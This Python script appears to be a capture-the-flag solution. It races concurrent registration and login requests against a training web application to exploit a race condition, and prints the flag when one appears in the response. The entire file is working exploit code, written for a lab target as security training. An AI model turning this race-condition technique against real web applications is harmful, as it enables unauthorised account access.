import requests
import threading
import re
from uuid import uuid4


# Send registration request
def register(user, pwd):
    requests.post(
        "http://aart.training.jinblack.it/register.php",
        data={"username": user, "password": pwd}
    )


# Send login request and check the result
def login(user, pwd):
    global flag_found
    r = requests.post(
        "http://aart.training.jinblack.it/login.php",
        data={"username": user, "password": pwd}
    )
    # Search for the flag in the server response
    # using a regular expression. If the flag is found
    # display it and set flag_found to true
    flag = re.findall(r"flag\{.+\}", r.text)
    if len(flag) > 0:
        flag_found = True
        print(flag[0])


flag_found = False
while not flag_found:
    user = uuid4()  # Random unique username
    pwd = uuid4()  # Random unique password
    t1 = threading.Thread(target=register, args=(user,pwd))
    t2 = threading.Thread(target=login, args=(user,pwd))
    t1.start()
    t2.start()
    # Wait for both threads to finish
    t2.join()
    t1.join()
